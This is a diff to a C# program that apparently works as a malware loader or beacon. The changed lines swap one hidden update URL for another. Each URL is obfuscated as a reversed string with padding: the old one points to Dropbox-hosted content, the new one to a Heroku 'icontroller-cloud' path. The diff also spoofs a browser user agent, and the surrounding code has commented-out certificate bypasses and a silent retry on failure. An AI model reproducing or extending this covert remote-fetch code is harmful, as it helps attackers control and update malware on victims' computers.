@@ -229,7 +229,6 @@ namespace iruwd7
         {
 
             
-
             try
             {
                 ChUp();
@@ -293,10 +292,10 @@ namespace iruwd7
                 //ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
                 //ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
 
-                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(RversedStr("Ald?txt=7niBVetadpu/o42pByu9gB2i54h/s/moc=xobpord=BBB//:sptthAAAA") + "=1"));
+                HttpWebRequest req = (HttpWebRequest)HttpWebRequest.Create(new Uri(RversedStr("Aetadpu/resu/vded/moc=ppaukoreh=duolc-rellortnoci//:sptthAAAA")));
 
                 req.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
-                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36";
+                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36";
                 req.Headers.Add("Accept-Encoding", "gzip, deflate, br");
                 HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
                 using (Stream stream = resp.GetResponseStream())
@@ -446,7 +445,7 @@ namespace iruwd7
                 }
 
             }
-            catch (Exception x)
+            catch (Exception)
             {
 
                 Thread.Sleep(TimeSpan.FromSeconds(rn.Next(1, 10)));
